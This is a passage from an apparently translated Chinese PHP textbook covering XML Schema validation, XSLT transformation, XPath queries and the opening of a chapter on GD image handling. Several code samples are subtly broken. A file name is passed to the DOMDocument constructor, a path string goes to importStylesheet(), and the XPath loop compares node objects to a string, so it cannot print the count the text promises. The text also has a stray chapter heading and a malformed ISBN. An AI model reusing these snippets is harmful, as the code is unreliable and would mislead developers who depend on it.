  \     <!-- 每个部分最多有 2 个链接、URL 和 TOC 条目 -->\n        <xsd:element name=\"linktitle2\"\
  \ type=\"xsd:string\" minOccurs=\"0\"/>\n        <xsd:element name=\"url2\" type=\"\
  xsd:uriReference\" minOccurs=\"0\"/>\n        <xsd:element name=\"annotation2\"\
  \ type=\"xsd:string\" minOccurs=\"0\"/>\n        <xsd:element name=\"toc2\" type=\"\
  xsd:boolean\" minOccurs=\"0\"/>\n    </xsd:sequence>\n</xsd:complexType>\n```\n\n\
  前面的代码列表包含了几个常见项。例如，标签 `<xsd:element name=\"linktitle2\" type=\"xsd:string\">`\n\n\
  \n\n\n`minOccurs=\"0\"/>` 定义了一个可以在相应的 XML 文档使用的元素。它还指定了数据类型（string）以及该数据类型必须出现的次数。在这种情况下，最小出现次数为\
  \ 0（零），因此它是一个可选元素。此示例还定义了复杂类型，例如 `SectionType`，它们由较小的元素组成。\n\n本书没有空间对 XML Schema\
  \ 进行详尽介绍，因此请利用网络和书店中一些优秀的教程。由 Lucinda Dykes 和 Ed Tittel 出版的第 4 版《*XML For Dummies*（Wiley\
  \ Publishing, Inc.）是一个很好的起点。\n\n创建好 schema 之后，就是时候使用它来验证传入的 XML 文档了。始终对进入你应用程序的任何\
  \ XML 进行验证，特别是来自外部源的。否则，你只是在盲目信任数据就是你预期的那样。信任可能是一种很好的美德，但在编写应用程序时并非如此！\n\n使用 schema\
  \ 验证 XML 文档最简单的方法是使用 `DOM` 对象。有关创建 `DOM` 对象的更多信息，请参考本章较早之前的“理解文档对象模型”章节。\n\n在将 XML\
  \ 读取到 `DOM` 对象后（如下例所示），只需使用此 `schemaValidate()` 方法将存储在 `DOM` 中的 XML 与 schema 定义的标准进行比较：\n\
  \n```php\n// Read the XML into the DOM object\n$dom_object = new DOMDocument(\"\
  xmlsource.xml\");\n$dom_object->schemaValidate(\"./my_schema.xsd\");\n```\n\n`schemaValidate()`\
  \ 返回一个 `Boolean` 值：如果 XML 验证成功则返回 true，否则返回 false。\n\n## 第 3 章：使用 XML\n\n在验证过程中遇到的错误会以\
  \ PHP 警告（warnings）的形式抛出，因此在生产环境中使用 `schemaValidate()` 之前，请确保已禁用警告。你不希望外部用户看到 XML\
  \ 验证警告，因为这些警告通常包含敏感的服务器信息，例如你的 schema 文档的路径。\n\n## 使用 XSLT 为你的文档添加样式\n\n你使用 `XSLT`（可扩展样式表语言转换）将一种类型的\
  \ XML 文档转换为另一种。`XSLT` 最常见的用途是将存储在 XML 文档中的数据转换为 HTML 文档。\n\n毕竟，`HTML` 仅仅是 `XML`\
  \ 的一个特殊版本。（`XML` 是 20 世纪 60 年代开发的 `SGML` [标准通用标记语言] 的直接后代。我们所熟知的 `XML` 大部分与 `SGML`\
  \ 相比实际上没有变化。`HTML` 是 20 世纪 80 年代末和 90 年代初作为 `SGML` 的应用创建的。`XML` 在 1996 年正式定义。2000\
  \ 年初开发了 `XHTML` 以使 HTML 重新符合 `SGML` 和 `XML`。）通常，在 XML 文档通过验证后（验证 XML 的细节请见上一节），必须通过样式表才能将数据呈现给最终用户。\n\
  \nPHP 内置了 `XSLT` 功能，只要在编译 PHP 时使用了 `--xsl` 关即可。要使用 PHP 的 `XSLT` 函数，请遵循以下步骤：\n\n\
  1. 创建一个 `XSLTProcessor` 对象和一个 `DOM` 文档对象：\n```php\n$xslt_processor = new XSLTProcessor();\n\
  $DOMdocument = new DOMDocument();\n```\n2. 将你的 `XSLT` 样式表导入到对象中：\n```php\n$xslt_processor->importStylesheet(\"\
  ./stylesheet.xsl\");\n```\n3. 将你的 XML 文档转换为另一种格式：\n```php\n$xslt_processor->transformToDoc($DOMdocument);\n\
  $xslt_processor->transformToURI($DOMdocument, $uri);\n$xslt_processor->transformToXML($DOMdocument);\n\
  ```\n要将 XML 转换为 HTML，请使用 `transformToXML()` 或 `transformToURI()` 方法。\n\n## 使用 XPath\
  \ 搜索 XML 文档\n\n`XPath` 是一个工具，让你能够从 XML 文档中提取单个节点，而无需必遍历整个文档。例如，假设你有有如下 XML：\n\n\
  ```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<library>\n  <book>\n    <title>XML\
  \ For Dummies, 4th Edition</title>\n    <author>Lucinda Dykes</author>\n    <author>Ed\
  \ Tittel</author>\n    <ISBN>9780764588457</ISBN>\n  </book>\n  <book>\n    <title>PHP\
  \ &amp; MySQL For Dummies, 3rd Edition</title>\n    <author>Janet Valade</author>\n\
  \    <ISBN>978047009600</ISBN>\n  </book>\n  <book>\n    <title>Database Development\
  \ For Dummies</title>\n    <author>Allen G. Taylor</author>\n    <ISBN>9780764507526</ISBN>\n\
  \  </book>\n  <book>\n    <title>XML for Programmers</title>\n    <author>Joe P.\
  \ Writer</author>\n    <ISBN>1234567890123</ISBN>\n  </book>\n</library>\n```\n\n\
  如果你需要提取 Janet Valade 编写的每本书的标题，你可以遍历每本书并将作者元素与字符串“Janet Valade”进行比较。这种方法相当慢，而且你作为开发者必须花费额外的精力。与其重新发明这个轮子，不如使用\
  \ `XPath` 精确地找到你需要的信息。按照以下步骤使用 `XPath` 查找图书馆中有多少书是 Janet Valade 写的：\n\n1. 创建一个 `domXPath`\
  \ 对象：\n```php\n$xpath = new domXPath($dom_object);\n```\n2. 在对象上执行 XPath 查询，返回一个结果数组：\n\
  ```php\n$authors = $xpath->query(\"/library/book/author\");\n```\n3. 遍历数组以找到精确结果：\n\
  ```php\n$found_books = 0;\nforeach ($authors as $author) {\n  if ($author == \"\
  Janet Valade\") {\n    $found_books++;\n  }\n}\nprint(\"Found \" . $found_books\
  \ . \" books by Janet Valade.\");\n```\n\n此脚本将打印一条消息，表明它在 XML 数据文件中恰好找到一本 Janet\
  \ Valade 编写的书。这是一个简单的示例，但它展示了你可以如何轻松地从大数据文件中提取特定数据。\n\n## 第 4 章：使用 GD 处理图像\n\n###\
  \ 本章\n- 配置 GD\n- 使用 GD 调整图像的大小和颜色\n- 使用 GD 在图像上添加文本\n\n\n\n\n\n但是，如果你需要根据页面内容包含更改的图像该怎么办？你可以创建几十个独立的图像文件，然后根据页面内容包含它们。但这种解决方案依赖于你能够预判所有需要的每张图像。这也是一种让你的文件系统充满几乎完全相同的文件的好方法。\n\
  \n幸运的是，有一种更好的方法。`GD` 扩展允许你从 `PHP` 内部动态创建并修改图像。动态创建图像有什么好处呢？假设你需要显示一个饼图，向用户展示你的图书馆数据库中虚构类和非虚构类书籍的精确百分比。如果没有\
  \ `GD`，你必须为每种可能性手动创建一个不同的饼图图像——创建这些图像将耗费你一整天的时间，占用大量的存储空间，可能还会让你头疼。或者，你可以将百分比（以及其他一些信息）发送给\
  \ `GD`，让它动态创建饼图。\n\n图像处理是非常消耗资源的，这可能会让你的应用程序运行得像爬行一样，甚至导致整个 Web 服务器崩溃。请务必在 `php.ini`\
  \ 中设置足够高的 `memory_limit` 以避免此类问题。设置到多少才够高？遗憾的是，这取决于你的硬件以及你正在进行多少图像处理。你必须通过不断尝试调整\
  \ `memory_limit`，直到在你的系统中找到完美的平衡点。\n\n### 查找支持的图像格式\n\n在使用 `GD` 之前，要做的第一件事是找出你的系统支持哪些图像类型。运行如下例所示的\
  \ `phpinfo()`，并查找 `gd` 部分。你会看到类似这样的：`$php -r ‘phpinfo();’`\n\n```\nphpinfo()\n\n\
  gd\n\nGD Support enabled\n\nGD Version 2.0 or higher\n\nFreeType Support enabled\n\
  \nFreeType Linkage with freetype\n\nJPG Support enabled\n\nPNG Support enabled\n\
  \nWBMP Support enabled\n```\n\n`PHP` 自带了它版本的 `GD`，该版本可能与官方标准版本略有不同，因此你通常使用捆绑的版本比从源码\
  \ `www.libgd.org` 获取 `GD` 要好。`PHP` 捆带的 `GD` 版本已经过优化配置，以与 `PHP` 配合工作。\n\n密切注意示例的最后三行。那些是系统支持的图像类型。要启用未列出的图像类型，你必须按照如下方式重新编译\
  \ `PHP` 并包含对其他图像类型的支持：\n\n```\n./configure ‘--with-gd’ ‘--with-png-dir=/usr’ ‘--with-jpeg-dir=/usr’\
  \ ‘--with-freetype-dir=/usr’ ‘--with-zlib-dir=/usr’\n```\n\n### 字体类型\n\n`GD` 支持\
